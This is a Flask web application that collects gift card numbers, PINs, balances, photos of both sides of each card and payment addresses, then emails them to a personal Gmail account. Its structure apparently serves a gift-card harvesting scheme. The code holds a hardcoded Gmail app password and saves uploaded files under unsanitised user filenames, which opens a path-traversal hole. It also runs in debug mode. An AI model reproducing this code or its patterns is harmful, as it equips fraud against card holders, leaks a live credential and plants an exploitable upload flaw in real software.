from flask import Flask, render_template, url_for, flash, redirect, request
from flask_mail import Mail, Message
import os

app = Flask(__name__)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'devservices06@gmail.com'
app.config['MAIL_PASSWORD'] = 'hyajtvezttxhvury'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True

mail = Mail(app)


@app.route("/", methods=['GET', 'POST'])
def home():
    if request.method == 'POST':

        giftCardName = request.form.get('giftCardName')
        availableBalance = request.form.get('availableBalance')
        type_card = request.form.get('type')
        condition = request.form.get('condition')
        cardNumber = request.form.get('cardNumber')
        pinNumber = request.form.get('pinNumber')
        cardPicFront = request.files['cardPicFront']
        cardPicFront.save(f'uploads/{cardPicFront.filename}')
        cardPicBack = request.files['cardPicBack']
        cardPicBack.save(f'uploads/{cardPicBack.filename}')
        email = request.form.get('email')
        paymentAddress = request.form.get('paymentAddress')
        msgBody = f"Card Name: {giftCardName}\nAvailable Balance: {availableBalance}\nType: {type_card}\nCondition: {condition}\nCard Number: {cardNumber}\nPin Number: {pinNumber}\nCard Picture Front: {cardPicFront}\nCard Picture Back: {cardPicBack}\nEmail: {email}\nPayment Address: {paymentAddress}"
        msg = Message(subject=f"Service request from {giftCardName}", body=msgBody, sender='info.kalyan', recipients=[
                      'devservices06@gmail.com'])
        with app.open_resource(f'uploads/{cardPicFront.filename}') as fp:
            msg.attach(f"{cardPicFront.filename}", "image/png", fp.read())
        with app.open_resource(f'uploads/{cardPicBack.filename}') as fp:
            msg.attach(f"{cardPicBack.filename}", "image/png", fp.read())
        mail.send(msg)

        return redirect(url_for('next_page'))
    return render_template('index.html')


@app.route("/next", methods=['GET', 'POST'])
def next_page():
    if len(os.listdir('uploads')) > 0:
        for f in os.listdir('uploads'):
            os.remove(os.path.join('uploads', f))
    if request.method == 'POST':

        giftCardName = request.form.get('giftCardName')
        availableBalance = request.form.get('availableBalance')
        type_card = request.form.get('type')
        condition = request.form.get('condition')
        cardNumber = request.form.get('cardNumber')
        pinNumber = request.form.get('pinNumber')
        email = request.form.get('email')
        paymentAddress = request.form.get('paymentAddress')
        msgBody = f"Card Name: {giftCardName}\nAvailable Balance: {availableBalance}\nType: {type_card}\nCondition: {condition}\nCard Number: {cardNumber}\nPin Number: {pinNumber}\nEmail: {email}\nPayment Address: {paymentAddress}"
        return render_template('nextPage.html')
    return render_template('nextPage.html')


if __name__ == "__main__":
    app.run(debug=True)
